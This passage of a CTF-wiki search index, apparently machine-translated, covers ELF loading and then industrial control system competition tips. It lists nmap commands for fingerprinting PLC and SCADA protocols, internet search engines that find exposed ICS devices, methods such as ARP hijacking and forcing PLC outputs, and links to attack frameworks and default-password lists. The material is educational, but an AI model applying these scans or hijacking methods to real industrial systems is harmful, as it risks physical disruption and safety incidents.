force the control of memory permissions, just like the permissions of each segment are completely independent; the segment address will be adjusted to ensure that each logical page in memory has only one type of permission. . In the example given above, the last part of the code segment of the file and the beginning of the data segment are mapped twice: the virtual address of the data segment and the virtual address of the code segment. The end of the data segment needs to deal with the data that has not been initialized. Generally, the system requires them to start with 0. Therefore, if the last page of a file contains information that is not in the logical page, the remaining data must be initialized to zero. The impurity data in the remaining three pages is not logically part of the process image, and the system can choose to delete them. The virtual memory image corresponding to this file is as follows (assuming each page is 4KB in size) When you load a segment, the executable is different from the shared object. Executable files usually contain absolute code. In order to be able to make the program execute correctly, each segment should be at the virtual address used to build the executable. Therefore, the system directly uses p_vaddr as a virtual address. On the other hand, shared object files usually contain address-independent code. This makes the virtual address of the same segment different in different processes, but this does not affect the execution behavior of the program. Although the system chooses different virtual addresses for different processes, it still maintains the relative addresses of the segments. Because the address independent code uses relative addresses in different segments, the difference between the virtual addresses in virtual memory is definitely the same as the difference between the corresponding virtual addresses in the file. The following is a list of possible different processes for the same shared object file, describing relative address addressing, and this table also gives a calculation of the base address.","title":"Program Loading"},{"location":"executable/elf/program-loading/#loading","text":"The program loading process is actually the process of creating or expanding the process mirror. It simply copies the segments of the file into the virtual memory segment according to certain rules. The process will apply for the corresponding physical page only if the corresponding logical page is used in the process of execution. In general, many pages in a process are not referenced. Therefore, delaying physical reads and writes can improve system performance. In order to achieve such efficiency, the executable file and the file offset and virtual address of the segment owned by the shared object file must be appropriate, that is, they must be integer multiples of the page size. In the Intel architecture, the virtual address and file offset must be 4KB integers, or a larger integer multiple of 2. Below is an example of an executable file loaded into memory layout The corresponding code segment and the data segment are explained as follows In this example, although the code segment and the data segment are equal in the sense of modulo 4KB, there are still up to 4 pages containing impure code or data. Of course, in practice it will depend on the page size or the block size of the file system. The first page of the code snippet contains the ELF header, the program header table, and other information. The last page of the code segment contains a copy of the beginning of the data segment. The last page of the data segment contains a copy of the last part of the code segment. As for how much, it has not been explained yet. The last part of the data segment may contain information that is not relevant to the program's operation. Logically speaking, the system will force the control of memory permissions, just like the permissions of each segment are completely independent; the segment address will be adjusted to ensure that each logical page in memory has only one type of permission. . In the example given above, the last part of the code segment of the file and the beginning of the data segment are mapped twice: the virtual address of the data segment and the virtual address of the code segment. The end of the data segment needs to deal with the data that has not been initialized. Generally, the system requires them to start with 0. Therefore, if the last page of a file contains information that is not in the logical page, the remaining data must be initialized to zero. The impurity data in the remaining three pages is not logically part of the process image, and the system can choose to delete them. The virtual memory image corresponding to this file is as follows (assuming each page is 4KB in size) When you load a segment, the executable is different from the shared object. Executable files usually contain absolute code. In order to be able to make the program execute correctly, each segment should be at the virtual address used to build the executable. Therefore, the system directly uses p_vaddr as a virtual address. On the other hand, shared object files usually contain address-independent code. This makes the virtual address of the same segment different in different processes, but this does not affect the execution behavior of the program. Although the system chooses different virtual addresses for different processes, it still maintains the relative addresses of the segments. Because the address independent code uses relative addresses in different segments, the difference between the virtual addresses in virtual memory is definitely the same as the difference between the corresponding virtual addresses in the file. The following is a list of possible different processes for the same shared object file, describing relative address addressing, and this table also gives a calculation of the base address.","title":"Loading"},{"location":"executable/elf/running-overview/","text":"Program execution process \u00b6 \u53c2\u8003 Execution Angleboye@Bamboofox \u3002 Basic Overview \u00b6 Static execution \u00b6 Here is the basic process of static execution of the program. Dynamic execution \u00b6 Here is another more detailed picture. Basic operation instructions \u00b6 sys_execve \u00b6 This function is mainly used to execute a new program, that is, execute the program we want to execute, and check the corresponding parameters such as argv and envp. do_execve \u00b6 This function opens the target image file and reads the specified length (currently 128 bytes) from the beginning of the target file to get the basic information of the corresponding target file. search_binary_handler \u00b6 This function searches for a binary type queue that supports handling of the current type, so that the handlers of various executable programs can be processed accordingly. load_elf_binary \u00b6 The main processing flow of this function is as follows Check and get the header information of the elf file. If the target file is dynamically linked, use the .interp section to determine the path to the loader. Map the corresponding segments recorded in the program header to memory. The following important information in the program header the address to which each segment needs to be mapped The appropriate permissions for each segment. Record which sections belong to which sections. The specific mapping is as follows Case processing In the case of dynamic linking, change the return address of sys_execve to the entry point of loader (ld.so). In the case of static linking, change the return address of sys_execve to the entry point of the program. ld.so \u00b6 This file has the following features Mainly used to load shared libraries recorded in DT_NEED in ELF files. Initialization work Initialize the GOT table. Merge the symbol table into the global symbol table. _start \u00b6 The _start function will hand over the following to libc_start_main Environment variable start address .init Initialization before starting the main function ends Finishing work before the end of the program.","title":"Program Execution Flow"},{"location":"executable/elf/running-overview/#program-execution-process","text":"\u53c2\u8003 Execution Angleboye@Bamboofox \u3002","title":"Program execution process"},{"location":"executable/elf/running-overview/#basic-overview","text":"","title":"Basic Overview"},{"location":"executable/elf/running-overview/#static-execution","text":"Here is the basic process of static execution of the program.","title":"Static execution"},{"location":"executable/elf/running-overview/#dynamic-execution","text":"Here is another more detailed picture.","title":"Dynamic execution"},{"location":"executable/elf/running-overview/#basic-operation-instructions","text":"","title":"Basic operation instructions"},{"location":"executable/elf/running-overview/#sys_execve","text":"This function is mainly used to execute a new program, that is, execute the program we want to execute, and check the corresponding parameters such as argv and envp.","title":"sys_execve"},{"location":"executable/elf/running-overview/#do_execve","text":"This function opens the target image file and reads the specified length (currently 128 bytes) from the beginning of the target file to get the basic information of the corresponding target file.","title":"do_execve"},{"location":"executable/elf/running-overview/#search_binary_handler","text":"This function searches for a binary type queue that supports handling of the current type, so that the handlers of various executable programs can be processed accordingly.","title":"search_binary_handler"},{"location":"executable/elf/running-overview/#load_elf_binary","text":"The main processing flow of this function is as follows Check and get the header information of the elf file. If the target file is dynamically linked, use the .interp section to determine the path to the loader. Map the corresponding segments recorded in the program header to memory. The following important information in the program header the address to which each segment needs to be mapped The appropriate permissions for each segment. Record which sections belong to which sections. The specific mapping is as follows Case processing In the case of dynamic linking, change the return address of sys_execve to the entry point of loader (ld.so). In the case of static linking, change the return address of sys_execve to the entry point of the program.","title":"load_elf_binary"},{"location":"executable/elf/running-overview/#ldso","text":"This file has the following features Mainly used to load shared libraries recorded in DT_NEED in ELF files. Initialization work Initialize the GOT table. Merge the symbol table into the global symbol table.","title":"ld.so"},{"location":"executable/elf/running-overview/#_start","text":"The _start function will hand over the following to libc_start_main Environment variable start address .init Initialization before starting the main function ends Finishing work before the end of the program.","title":"_start"},{"location":"ics/ctfs/","text":"> The content of this column, the content of the ICS CTF competition comes from the author's own experience in playing the game. If it is not right, please criticize and correct the teacher. Domestic industrial control competition inspection point \u00b6 Using the CTF classification model to summarize and analyze the key points in the current industrial control ICS competition Competition Type Investigation Point Similar to CTF |Intranet penetration|Web-side penetration testing, CMS system, industrial control release display system, database system|related to Web penetration | Reverse Analysis | Firmware Analysis, Industrial Control Software Reverse | Actual Scene Reverse | | Industrial Control Protocol | Industrial Control Flow Analysis, Misc Class | Misc Flow Analysis, Industrial Control Flow Characteristics | | Industrial Control Programming | PLC Configuration, HMI Configuration, RTU Configuration, etc. | Industrial Control Configuration Software Use, Ladder Recognition and Analysis | According to the type of vulnerability, it is also possible to distinguish the types of refinement topics, including common Web injection classes, firmware weak passwords, backdoor programs, protocol replay and logic issues, configuration deployment issues, and other common industrial security scenarios. Competition Type Vulnerability Type |Intranet penetration|Web class (SQL, XSS, command injection, sensitive file disclosure. git/.idea/.project, etc.) | Reverse Analysis | Firmware Analysis, Industrial Control Software Reverse | Actual Software, DLL, ELF, MIPS Reverse | | Industrial Control Protocol | Industrial Control Flow Analysis, Misc Class | Misc Flow Analysis, Industrial Control Flow Characteristics | | Industrial Control Programming | PLC Configuration, HMI Configuration | Industrial Control Real Configuration Software Use, Ladder Recognition and Analysis | In view of the types of ICS CTFs that have appeared or have appeared in the past, there are many coincidences with the CTF competition. Therefore, this is not to be repeated. It is mainly discussed in the CTF that is not consistent with the CTF competition. Web penetration class (Web) \u00b6 This section focuses on the characteristics of industrial control Web penetration: Highly compatible with business scenarios. For example, in industrial control, the Web terminal mainly displays information such as control parameters and running status in the current usage scenario. If it is hijacked by an intermediary in the internal network, the HMI display device cannot run the device in real time with the PLC. When synchronizing, the system will alarm or make an error. General use of common technology to display the Web interface, with the Windows operating system as the main platform, including WinCC, Windows Server, Windows 98/2000/XP and other seemingly ancient systems. Web infiltration will retain multiple ports, such as FTP, HTTPS, Telnet, SNMP, NTP and other service ports, you can try other ports while Web penetration can not be penetrated. Because industrial control is generally in the internal network environment, intranet hijacking is often more effective. However, if the internal network is configured with static IP or other protection measures, the intranet hijacking method such as ARP spoofing mode cannot take effect. Sensitive information leaks and incomplete configuration files are common problems in industrial control web publishing. Not only include engineering information protocols such as .git/.idea/.project, but also path traversal, command injection, weak passwords, etc. Reverse Analysis (Reverse) \u00b6 This section mainly discusses the characteristics of industrial control reverse: The industrial control operating system is generally RTOS (Real Time Operate System). For example, real-time operating systems such as vxworks and uc-os need to be familiar with the architecture and instruction set in the reverse direction. If you do not understand, please learn by yourself. The common target of industrial control firmware reverse is the common firmware reverse vulnerability such as industrial control engineering encryption algorithm, hard coded key, hard coded backdoor, etc. If a stack overflow vulnerability is discovered, it can often lead to target device downtime (ie DOS consequences). The firmware of the industrial control often has encryption and compression. It needs to be decompressed or decrypted in the first step of decompression. This part is based on the specific manufacturer and cannot be generalized. Industrial control firmware has no reverse analysis Industrial Control Protocol (Protocol) \u00b6 This section mainly talks about the relevant characteristics of industrial control protocol topics: The industrial control protocol is designed for industrial control scenarios, with features such as simplicity, high efficiency, and low latency. Therefore, simple attacks such as replay and command injection can be considered for such attacks. The industrial control protocol not only uses the public agreement, but also includes a large number of private agreements. The specific details of this part of the agreement need to reverse or collect data to achieve the restoration of data functions. For example, Modbus, DNP3, Melsec-Q, S7, Ethernet/IP, etc. The industrial control protocol may cause problems such as downtime and non-restart of the target PLC, DCS, RTU, etc. The Fuzz-based method can quickly and efficiently find the PLC downtime vulnerability. There may be many operations in the industrial control protocol for devices such as PLCs. Users need to distinguish between legal requests and exception requests. This requires experience and needs to study the logic of the current traffic. This scene is very suitable for the conditions of machine learning, which can be considered as a direction of exploration. The actual defense scheme for the industrial control scenario is actually the best bypass detection. The traffic is connected to the analysis system through the splitting, and the target system is monitored safely without affecting the normal service usage. \u5de5\u63a7\u7f16\u7a0b(Program) \u00b6 Industrial control programming is the core and focus of the operation of industrial control systems. The characteristics of such topics are generally: The core of industrial control programming is to understand the logic of industrial control business, and the industrial control programming follows IEC61131-3 (the first standard in the history of industrial control to realize joint programming of PLC, DCS, motion control, SCADA, etc. - IEC61131-3), including five programming language standards. The three types are graphical languages (ladder diagrams, sequential function diagrams, and function block diagrams), and two are textual languages (instruction tables and structured text). Industrial control equipment can often be debugged online, so that some input and output ports can be controlled to realize the function of forced start and stop. If these functions can be retransmitted by Remote, the attack hazard is more serious. Industrial control equipment is connected in a variety of ways, generally using a serial port, but the current development of the device supports Ethernet, USB interface and other new methods, if the network port does not try serial port, USB. The industrial control configuration can be very complicated. It is even possible to connect hundreds or thousands of inputs and outputs. The configuration will be more troublesome due to the addition of new components. At this time, you should look slowly and pick it up a little bit. The above is some of my experience in participating in the industrial control competition, hoping to give more guidance to the small partners who will participate in the competition.","title":"ICS_CTF Contest"},{"location":"ics/ctfs/#domestic-industrial-control-competition-inspection-point","text":"Using the CTF classification model to summarize and analyze the key points in the current industrial control ICS competition Competition Type Investigation Point Similar to CTF |Intranet penetration|Web-side penetration testing, CMS system, industrial control release display system, database system|related to Web penetration | Reverse Analysis | Firmware Analysis, Industrial Control Software Reverse | Actual Scene Reverse | | Industrial Control Protocol | Industrial Control Flow Analysis, Misc Class | Misc Flow Analysis, Industrial Control Flow Characteristics | | Industrial Control Programming | PLC Configuration, HMI Configuration, RTU Configuration, etc. | Industrial Control Configuration Software Use, Ladder Recognition and Analysis | According to the type of vulnerability, it is also possible to distinguish the types of refinement topics, including common Web injection classes, firmware weak passwords, backdoor programs, protocol replay and logic issues, configuration deployment issues, and other common industrial security scenarios. Competition Type Vulnerability Type |Intranet penetration|Web class (SQL, XSS, command injection, sensitive file disclosure. git/.idea/.project, etc.) | Reverse Analysis | Firmware Analysis, Industrial Control Software Reverse | Actual Software, DLL, ELF, MIPS Reverse | | Industrial Control Protocol | Industrial Control Flow Analysis, Misc Class | Misc Flow Analysis, Industrial Control Flow Characteristics | | Industrial Control Programming | PLC Configuration, HMI Configuration | Industrial Control Real Configuration Software Use, Ladder Recognition and Analysis | In view of the types of ICS CTFs that have appeared or have appeared in the past, there are many coincidences with the CTF competition. Therefore, this is not to be repeated. It is mainly discussed in the CTF that is not consistent with the CTF competition.","title":"Domestic industrial control competition inspection point"},{"location":"ics/ctfs/#web-penetration-class-web","text":"This section focuses on the characteristics of industrial control Web penetration: Highly compatible with business scenarios. For example, in industrial control, the Web terminal mainly displays information such as control parameters and running status in the current usage scenario. If it is hijacked by an intermediary in the internal network, the HMI display device cannot run the device in real time with the PLC. When synchronizing, the system will alarm or make an error. General use of common technology to display the Web interface, with the Windows operating system as the main platform, including WinCC, Windows Server, Windows 98/2000/XP and other seemingly ancient systems. Web infiltration will retain multiple ports, such as FTP, HTTPS, Telnet, SNMP, NTP and other service ports, you can try other ports while Web penetration can not be penetrated. Because industrial control is generally in the internal network environment, intranet hijacking is often more effective. However, if the internal network is configured with static IP or other protection measures, the intranet hijacking method such as ARP spoofing mode cannot take effect. Sensitive information leaks and incomplete configuration files are common problems in industrial control web publishing. Not only include engineering information protocols such as .git/.idea/.project, but also path traversal, command injection, weak passwords, etc.","title":"Web penetration class (Web)"},{"location":"ics/ctfs/#reverse-analysis-reverse","text":"This section mainly discusses the characteristics of industrial control reverse: The industrial control operating system is generally RTOS (Real Time Operate System). For example, real-time operating systems such as vxworks and uc-os need to be familiar with the architecture and instruction set in the reverse direction. If you do not understand, please learn by yourself. The common target of industrial control firmware reverse is the common firmware reverse vulnerability such as industrial control engineering encryption algorithm, hard coded key, hard coded backdoor, etc. If a stack overflow vulnerability is discovered, it can often lead to target device downtime (ie DOS consequences). The firmware of the industrial control often has encryption and compression. It needs to be decompressed or decrypted in the first step of decompression. This part is based on the specific manufacturer and cannot be generalized. Industrial control firmware has no reverse analysis","title":"Reverse Analysis (Reverse)"},{"location":"ics/ctfs/#industrial-control-protocol-protocol","text":"This section mainly talks about the relevant characteristics of industrial control protocol topics: The industrial control protocol is designed for industrial control scenarios, with features such as simplicity, high efficiency, and low latency. Therefore, simple attacks such as replay and command injection can be considered for such attacks. The industrial control protocol not only uses the public agreement, but also includes a large number of private agreements. The specific details of this part of the agreement need to reverse or collect data to achieve the restoration of data functions. For example, Modbus, DNP3, Melsec-Q, S7, Ethernet/IP, etc. The industrial control protocol may cause problems such as downtime and non-restart of the target PLC, DCS, RTU, etc. The Fuzz-based method can quickly and efficiently find the PLC downtime vulnerability. There may be many operations in the industrial control protocol for devices such as PLCs. Users need to distinguish between legal requests and exception requests. This requires experience and needs to study the logic of the current traffic. This scene is very suitable for the conditions of machine learning, which can be considered as a direction of exploration. The actual defense scheme for the industrial control scenario is actually the best bypass detection. The traffic is connected to the analysis system through the splitting, and the target system is monitored safely without affecting the normal service usage.","title":"Industrial Control Protocol (Protocol)"},{"location":"ics/ctfs/#program","text":"Industrial control programming is the core and focus of the operation of industrial control systems. The characteristics of such topics are generally: The core of industrial control programming is to understand the logic of industrial control business, and the industrial control programming follows IEC61131-3 (the first standard in the history of industrial control to realize joint programming of PLC, DCS, motion control, SCADA, etc. - IEC61131-3), including five programming language standards. The three types are graphical languages (ladder diagrams, sequential function diagrams, and function block diagrams), and two are textual languages (instruction tables and structured text). Industrial control equipment can often be debugged online, so that some input and output ports can be controlled to realize the function of forced start and stop. If these functions can be retransmitted by Remote, the attack hazard is more serious. Industrial control equipment is connected in a variety of ways, generally using a serial port, but the current development of the device supports Ethernet, USB interface and other new methods, if the network port does not try serial port, USB. The industrial control configuration can be very complicated. It is even possible to connect hundreds or thousands of inputs and outputs. The configuration will be more troublesome due to the addition of new components. At this time, you should look slowly and pick it up a little bit. The above is some of my experience in participating in the industrial control competition, hoping to give more guidance to the small partners who will participate in the competition.","title":"\u5de5\u63a7\u7f16\u7a0b(Program)"},{"location":"ics/discover/","text":"> The content of this column, the content of the ICS CTF competition comes from the author's own experience in playing the game. If it is not right, please criticize and correct the teacher. Industrial equipment discovery \u00b6 Industrial control equipment discovery is the premise of industrial control competition. At present, in the industrial control equipment scanning, a large number of tools are integrated in Nmap, Metasploit and Censes to mine current online PLC, DCS and other ICS equipment. Industrial Control Scan Script \u00b6 Information scanning script based on industrial control port \u00b6 How to find industrial control equipment in a large number of IP, in addition to industrial control special port accidents, a large number of ports are normal services, such as ftp, ssh, telnet, smtp, ntp and other normal network services. The following list lists the current open source industrial control scan scripts. Port Protocol/Device Source |102(TCP)|siemens s7|nmap --script s7-info.nse -p 102 [host] nmap -sP --script s71200-enumerate-old.nse -p 102 [host]| |502(TCP)|modbus|nmap --script modicon-info -p 502 [host]| |2404(TCP)|IEC 60870-5-104|nmap -Pn -n -d --script iec-identify.nse --script-args='iec-identify.timeout=500' -p 2404 [host]| |20000(TCP)|DNP3|nmap -sT --script dnp3-enumerate.nse -p 20000 [host] nmap --script dnp3-info -p 20000 [host]| |44818(TCP)|Ethernet/IP|nmap --script enip-enumerate -sU -p 44818 [host]| |47808(UDP)|BACnet|nmap --script BACnet-discover-enumerate.nse -sU -p 47808 [host]| |1911(TCP)|Tridium Nixagara Fo|nmap --script fox-info.nse -p 1911 [host]| |789(TCP)|Crimson V3|nmap --scripts cr3-fingerprint.nse -p 789 [host]| |9600(TCP)|OMRON FINS|nmap --script ormontcp-info -p 9600 [host]| |1962 (TCP)|PCWorx|nmap --script pcworx-info -p 1962 [host]| |20547(TCP)|ProConOs|nmap --script proconos-info -p 20547 [host]| |5007(TCP)|Melsec-Q|nmap -script melsecq-discover -sT -p 5007 [host]| |5006|Melsec-Q|nmap -script melsecq-discover-udp.nse -sU -p 5006 [host]| |956(TCP)|CSPV4|Unknown| |4840(TCP)|OPCUA|Unknown| |18245(TCP)|GE SRTP|Unknown| |1200(TCP)|Codesys|nmap \u2013script codesys-v2-discover.nse [host]| |10001|atg|nmap --script atg-info -p 10001 [host]| |2222|cspv4|nmap --script cspv4-info -p 2222 [host]| |1911|fox|nmap --script fox-info.nse -p 1911 [host]| |4800|moxa|nmap -sU --script moxa-enum -p 4800 [host]| | 137 | siemens wincc | sudo nmap -sU --script Siemens-WINCC.nse -p137 [host] | |445|stuxnet|nmap --script stuxnet-detect -p 445 [host]| The above script does not completely list the current use of script information, which is not yet to be continued... Component scanning method based on industrial control configuration software \u00b6 Each industrial control manufacturer often comes with configuration software. When configuring the software, it can independently discover the target PLC device when connecting the devices in the current intranet. Port Protocol/Device Connection Method |102(TCP)|siemens s7|Siemens Software Step7 comes with scanning the current network segment PLC device function| |502(TCP)|modbus|Schneider SoMachine Basic Connect PLC device with scanning intranet segment function| Industrial Control Scanning and Discovery Engine \u00b6 Shodan \u64ce \u00b6 *Shodan is a cyberspace search engine that searches for devices, servers, cameras, industrial control devices, smart homes, etc. that exist on the Internet and can identify their version, location, port, service and other information. In 2013, Shodan added detection for industrial control protocols. Users can directly retrieve all data of the protocol using the port of the industrial control protocol. Users can also use the feature Dork to directly search for corresponding device data. * Zoomeye Engine \u00b6 *ZoomEye is a search engine for cyberspace created by Chuangyu. ZoomEye launched the industrial control project (ics.zoomeye.org) in March 2015. ZoomEye supports data retrieval for 12 industrial control protocols. Users can also use the industrial control protocol. Ports and Features The Dork keyword finds industrial hardware and software exposed to the Internet. For industrial control protocol type data, ZoomEye enables a protection policy that cannot be viewed directly by normal users. * FOFA Engine \u00b6 FOFA is a cyberspace asset search engine launched by White Hat. It can help users quickly match network assets and speed up the follow-up work process. For example, vulnerability analysis scope analysis, application distribution statistics, application popularity ranking statistics, etc. Diting Full Net Engine \u00b6 *Ditecting cyberspace industrial control equipment search engine, to listen to the meaning of all things, is intended to search for industrial control system networking equipment exposed on the Internet, to help security manufacturers maintain industrial control system security, follow the malicious intentions. * Censys Full Network Engine \u00b6 *Censys is a search engine that allows computer scientists to understand the devices and networks that make up the Internet. Driven by Internet-wide scanning, Censys enables researchers to find specific hosts and create configuration and deployment information for devices, websites, and certificates into a single overall report. * The types of vulnerability engines are different, and there are big differences in configuration and deployment nodes. Currently, the search engine for industrial control is more professional with shodan and ditecting, but from the perspective of ports, each engine claims that the retrieval method is not Do the same. Comparison of various search engines \u00b6 To be continued.....","title":"ICS_CTF Discovery"},{"location":"ics/discover/#industrial-equipment-discovery","text":"Industrial control equipment discovery is the premise of industrial control competition. At present, in the industrial control equipment scanning, a large number of tools are integrated in Nmap, Metasploit and Censes to mine current online PLC, DCS and other ICS equipment.","title":"Industrial equipment discovery"},{"location":"ics/discover/#industrial-control-scan-script","text":"","title":"Industrial Control Scan Script"},{"location":"ics/discover/#information-scanning-script-based-on-industrial-control-port","text":"How to find industrial control equipment in a large number of IP, in addition to industrial control special port accidents, a large number of ports are normal services, such as ftp, ssh, telnet, smtp, ntp and other normal network services. The following list lists the current open source industrial control scan scripts. Port Protocol/Device Source |102(TCP)|siemens s7|nmap --script s7-info.nse -p 102 [host] nmap -sP --script s71200-enumerate-old.nse -p 102 [host]| |502(TCP)|modbus|nmap --script modicon-info -p 502 [host]| |2404(TCP)|IEC 60870-5-104|nmap -Pn -n -d --script iec-identify.nse --script-args='iec-identify.timeout=500' -p 2404 [host]| |20000(TCP)|DNP3|nmap -sT --script dnp3-enumerate.nse -p 20000 [host] nmap --script dnp3-info -p 20000 [host]| |44818(TCP)|Ethernet/IP|nmap --script enip-enumerate -sU -p 44818 [host]| |47808(UDP)|BACnet|nmap --script BACnet-discover-enumerate.nse -sU -p 47808 [host]| |1911(TCP)|Tridium Nixagara Fo|nmap --script fox-info.nse -p 1911 [host]| |789(TCP)|Crimson V3|nmap --scripts cr3-fingerprint.nse -p 789 [host]| |9600(TCP)|OMRON FINS|nmap --script ormontcp-info -p 9600 [host]| |1962 (TCP)|PCWorx|nmap --script pcworx-info -p 1962 [host]| |20547(TCP)|ProConOs|nmap --script proconos-info -p 20547 [host]| |5007(TCP)|Melsec-Q|nmap -script melsecq-discover -sT -p 5007 [host]| |5006|Melsec-Q|nmap -script melsecq-discover-udp.nse -sU -p 5006 [host]| |956(TCP)|CSPV4|Unknown| |4840(TCP)|OPCUA|Unknown| |18245(TCP)|GE SRTP|Unknown| |1200(TCP)|Codesys|nmap \u2013script codesys-v2-discover.nse [host]| |10001|atg|nmap --script atg-info -p 10001 [host]| |2222|cspv4|nmap --script cspv4-info -p 2222 [host]| |1911|fox|nmap --script fox-info.nse -p 1911 [host]| |4800|moxa|nmap -sU --script moxa-enum -p 4800 [host]| | 137 | siemens wincc | sudo nmap -sU --script Siemens-WINCC.nse -p137 [host] | |445|stuxnet|nmap --script stuxnet-detect -p 445 [host]| The above script does not completely list the current use of script information, which is not yet to be continued...","title":"Information scanning script based on industrial control port"},{"location":"ics/discover/#component-scanning-method-based-on-industrial-control-configuration-software","text":"Each industrial control manufacturer often comes with configuration software. When configuring the software, it can independently discover the target PLC device when connecting the devices in the current intranet. Port Protocol/Device Connection Method |102(TCP)|siemens s7|Siemens Software Step7 comes with scanning the current network segment PLC device function| |502(TCP)|modbus|Schneider SoMachine Basic Connect PLC device with scanning intranet segment function|","title":"Component scanning method based on industrial control configuration software"},{"location":"ics/discover/#industrial-control-scanning-and-discovery-engine","text":"","title":"Industrial Control Scanning and Discovery Engine"},{"location":"ics/discover/#shodan","text":"*Shodan is a cyberspace search engine that searches for devices, servers, cameras, industrial control devices, smart homes, etc. that exist on the Internet and can identify their version, location, port, service and other information. In 2013, Shodan added detection for industrial control protocols. Users can directly retrieve all data of the protocol using the port of the industrial control protocol. Users can also use the feature Dork to directly search for corresponding device data. *","title":"Shodan \u64ce"},{"location":"ics/discover/#zoomeye-engine","text":"*ZoomEye is a search engine for cyberspace created by Chuangyu. ZoomEye launched the industrial control project (ics.zoomeye.org) in March 2015. ZoomEye supports data retrieval for 12 industrial control protocols. Users can also use the industrial control protocol. Ports and Features The Dork keyword finds industrial hardware and software exposed to the Internet. For industrial control protocol type data, ZoomEye enables a protection policy that cannot be viewed directly by normal users. *","title":"Zoomeye Engine"},{"location":"ics/discover/#fofa-engine","text":"FOFA is a cyberspace asset search engine launched by White Hat. It can help users quickly match network assets and speed up the follow-up work process. For example, vulnerability analysis scope analysis, application distribution statistics, application popularity ranking statistics, etc.","title":"FOFA Engine"},{"location":"ics/discover/#diting-full-net-engine","text":"*Ditecting cyberspace industrial control equipment search engine, to listen to the meaning of all things, is intended to search for industrial control system networking equipment exposed on the Internet, to help security manufacturers maintain industrial control system security, follow the malicious intentions. *","title":"Diting Full Net Engine"},{"location":"ics/discover/#censys-full-network-engine","text":"*Censys is a search engine that allows computer scientists to understand the devices and networks that make up the Internet. Driven by Internet-wide scanning, Censys enables researchers to find specific hosts and create configuration and deployment information for devices, websites, and certificates into a single overall report. * The types of vulnerability engines are different, and there are big differences in configuration and deployment nodes. Currently, the search engine for industrial control is more professional with shodan and ditecting, but from the perspective of ports, each engine claims that the retrieval method is not Do the same.","title":"Censys Full Network Engine"},{"location":"ics/discover/#comparison-of-various-search-engines","text":"To be continued.....","title":"Comparison of various search engines"},{"location":"ics/exploit/","text":"> The content of the ICS CTF competition comes from the author's own experience in playing the game. If there is something wrong, please forgive me. Exploit is a variety of exploits for a vulnerability, and there are many ways to exploit a vulnerability. For the industrial control field, in fact, the most common use methods: configuration utilization, communication hijacking, Web penetration. Configuration Utilization \u00b6 Configuration is the core of the industrial control scene, and is the core content of the industrial control programming and implementation functions. If you do not understand the configuration, please learn the related books of the industrial control system configuration in the automation field. The best way to learn is to get the relevant product manual and learn about the content of the manual. Configuration utilization: Force IO (the most useful debugging method) Engineering encryption and decryption (engineering encryption is a protection measure for PLC, but there is still the possibility of being cracked) Upload and download (basic concept please make up for it) The memory distribution of target devices such as PLC (the basic concept please make up for it) Other additional features (such as ftp, ntp, etc.) Communication hijacking \u00b6 Communication hijacking is the most classic use in industrial control scenarios, such as ARP hijacking, PLC/HMI communication hijacking, PLC session hijacking, and PLC command execution. Communication hijacking method: ARP hijacking, ARP hijacking can block the communication between PLC and other devices. Since the project will have interactive addresses such as write dead IP, it may not be useful, but it is worth a try. PLC/HMI communication hijacking, using bypass equipment to access or control PLC equipment, forcibly rewriting or outputting IO PLC command execution, the most sensitive part of the industrial control equipment is equipment down (unrecoverable), equipment start and stop, equipment forced update parameters, etc. These can have a greater impact on the general process. Web penetration \u00b6 Target enterprises often have Web-based industrial control applications, such as publishing process release pages, user databases and other pages, which are basically the same as weekday Web topics. Weak password (common in industrial control, manufacturer default password in industrial equipment) Command injection (commonly used, need to audit Web project source code) Directory traversal (simple hand test, difficult to use, need to be combined with uploading and other functions) Preset backdoors (more difficult to find, need to combine reverse and web penetration) SQL class injection (simple) XSS is basically useless here (basically not encountered) Project file leaked (project files such as .git/.idea/.project are leaked)","title":"ICS_CTF Exploit"},{"location":"ics/exploit/#configuration-utilization","text":"Configuration is the core of the industrial control scene, and is the core content of the industrial control programming and implementation functions. If you do not understand the configuration, please learn the related books of the industrial control system configuration in the automation field. The best way to learn is to get the relevant product manual and learn about the content of the manual. Configuration utilization: Force IO (the most useful debugging method) Engineering encryption and decryption (engineering encryption is a protection measure for PLC, but there is still the possibility of being cracked) Upload and download (basic concept please make up for it) The memory distribution of target devices such as PLC (the basic concept please make up for it) Other additional features (such as ftp, ntp, etc.)","title":"Configuration Utilization"},{"location":"ics/exploit/#communication-hijacking","text":"Communication hijacking is the most classic use in industrial control scenarios, such as ARP hijacking, PLC/HMI communication hijacking, PLC session hijacking, and PLC command execution. Communication hijacking method: ARP hijacking, ARP hijacking can block the communication between PLC and other devices. Since the project will have interactive addresses such as write dead IP, it may not be useful, but it is worth a try. PLC/HMI communication hijacking, using bypass equipment to access or control PLC equipment, forcibly rewriting or outputting IO PLC command execution, the most sensitive part of the industrial control equipment is equipment down (unrecoverable), equipment start and stop, equipment forced update parameters, etc. These can have a greater impact on the general process.","title":"Communication hijacking"},{"location":"ics/exploit/#web-penetration","text":"Target enterprises often have Web-based industrial control applications, such as publishing process release pages, user databases and other pages, which are basically the same as weekday Web topics. Weak password (common in industrial control, manufacturer default password in industrial equipment) Command injection (commonly used, need to audit Web project source code) Directory traversal (simple hand test, difficult to use, need to be combined with uploading and other functions) Preset backdoors (more difficult to find, need to combine reverse and web penetration) SQL class injection (simple) XSS is basically useless here (basically not encountered) Project file leaked (project files such as .git/.idea/.project are leaked)","title":"Web penetration"},{"location":"ics/learn/","text":">EscortLab collects and organizes a series of related IoT data for everyone to learn IoT Industry Information https://www.iotdunia.com/iotdunia Using the framework \u00b6 isf uses the framework https://github.com/dark-lbp/isf isf uses the framework https://github.com/w3h/isf Organizing ICS resources \u00b6 icsmaster https://github.com/w3h/icsmaster rapidscada https://github.com/RapidScada/scada weak password collection \u00b6 Industrial Control Weak Password https://github.com/scadastrangelove/SCADAPASS TOP1 million series weak password https://github.com/danielmiessler/SecLists/tree/master/Passwords honey pot honeypot \u00b6 Conpot https://github.com/mushorg/conpot Using gadgets \u00b6 PLC scan discovery tool PLCscan https://code.google.com/archive/p/plcscan/source Industrial Control Situational Awareness \u00b6 [NSA developed industrial control ICS/SCADA situational awareness open source tool Grassmarlin] ( https://github.com/iadgov/grassmarlin )","title":"ICS_CTF Learning Resources"},{"location":"ics/learn/#using-the-framework","text":"isf uses the framework https://github.com/dark-lbp/isf isf uses the framework https://github.com/w3h/isf","title":"Using the framework"},{"location":"ics/learn/#organizing-ics-resources","text":"icsmaster https://github.com/w3h/icsmaster rapidscada https://github.com/RapidScada/scada","title":"Organizing ICS resources"},{"location":"ics/learn/#weak-password-collection","text":"Industrial Control Weak Password 